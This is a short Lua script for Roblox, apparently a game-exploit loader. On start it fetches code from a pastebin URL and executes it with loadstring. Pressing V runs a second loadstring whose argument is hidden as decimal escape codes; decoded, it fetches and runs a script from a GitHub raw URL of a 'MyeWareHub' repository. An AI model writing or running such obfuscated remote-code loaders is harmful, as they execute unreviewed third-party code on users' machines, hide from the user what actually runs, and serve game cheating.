loadstring(game:HttpGet("https://pastebin.com/raw/4Dsqhj9v"))()

local userInputService = game:GetService("UserInputService")

userInputService.InputBegan:Connect(function(input, gameProcessedEvent)

	if input.UserInputType == Enum.UserInputType.Keyboard then

		if input.KeyCode == Enum.KeyCode.V then

			loadstring("\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\121\101\49\50\51\47\77\121\101\87\97\114\101\72\117\98\47\109\97\105\110\47\104\105\34\41\41\40\41\10")()
		end
	end
end)
